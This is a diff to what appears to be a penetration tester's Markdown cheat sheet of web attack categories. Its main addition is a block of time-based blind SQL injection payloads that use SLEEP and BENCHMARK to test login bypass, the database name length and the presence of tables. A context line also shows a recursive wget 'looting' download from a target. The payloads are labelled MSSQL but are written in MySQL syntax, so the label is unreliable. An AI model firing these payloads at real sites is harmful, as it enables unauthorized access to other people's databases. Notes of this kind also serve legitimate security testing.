@@ -44,9 +44,28 @@ wget -r -np -R "index.html*" https://target.to.loot/folder/
 ## SAML
 ## OAuth
 ## JWT
-## Vertical ccess control
-## Horizontal ccess control
+## Vertical access control
+## Horizontal access control
 ## SQLi
+
+### time based
+
+```bash
+# MSSQL
+    'admin" OR IF(1=1, SLEEP(5), 0) -- ',
+    'admin" OR IF(1=2, 0, SLEEP(5)) -- ',
+    'admin" OR IF(1=1, BENCHMARK(1000000, MD5(1)), 0) -- ',
+    'admin" OR IF(1=2, 0, BENCHMARK(1000000, MD5(1))) -- ',
+    'admin" OR IF(LENGTH(database()) > 1, SLEEP(5), 0) -- ',
+    'admin" OR IF(LENGTH(database()) > 100, 0, SLEEP(5)) -- ',
+    'admin" OR IF(EXISTS(SELECT 1 FROM users), SLEEP(5), 0) -- ',
+    'admin" OR IF(EXISTS(SELECT * FROM information_schema.tables), SLEEP(5), 0) -- ',
+    'admin" OR IF(EXISTS(SELECT 1), SLEEP(5), 0) -- ',
+    'admin" OR IF(1=1, SLEEP(5), 0) /* '
+
+```
+
+
 ## OS
 ## SSTI
 ## XXE
@@ -54,7 +73,6 @@ wget -r -np -R "index.html*" https://target.to.loot/folder/
 ## Deserilization
 ## Race condition
 ## CORS
-## X-domain
 ## XSS
 ## CSRF
 ## CSTI
